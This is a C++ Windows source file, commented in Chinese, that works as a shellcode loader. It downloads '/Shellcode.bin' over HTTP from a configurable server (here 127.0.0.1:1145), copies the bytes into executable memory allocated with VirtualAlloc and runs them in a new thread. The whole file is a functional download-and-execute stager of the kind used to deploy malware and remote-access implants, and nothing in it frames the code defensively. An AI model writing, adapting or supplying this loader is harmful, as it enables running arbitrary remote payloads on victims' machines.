#include <Windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#pragma comment(lib, "wininet.lib")

int main() {
    // Initialize the WinINet API
    HINTERNET hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpenA() Drop Error: " << GetLastError() << std::endl;
        return 1;
    }

    // 先连接
    //此处127.0.0.1对应Http服务IP 1145是端口
    HINTERNET hConnect = InternetConnectA(hInternet, "127.0.0.1", 1145, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnectA() Drop Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 构建请求 "/Shellcode.bin"就是对应在Web服务上面要读取的shellcode
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/Shellcode.bin", NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequestA() Drop Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 发送请求
    BOOL bSendRequest = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    if (!bSendRequest) {
        std::cerr << "HttpSendRequestA() Drop Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 读请求内容
    std::vector<unsigned char> shellcode;
    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    LPVOID execAddress = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!execAddress) {
        std::cerr << "VirtualAlloc() Drop Error: " << GetLastError() << std::endl;
        return 1;
    }

    // 拷进内存
    std::memcpy(execAddress, shellcode.data(), shellcode.size());

    // 创建线程执行
    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execAddress, 0, 0, 0);
    if (!hThread) {
        std::cerr << "CreateThread() Drop Error: " << GetLastError() << std::endl;
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFree(execAddress, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return 0;
}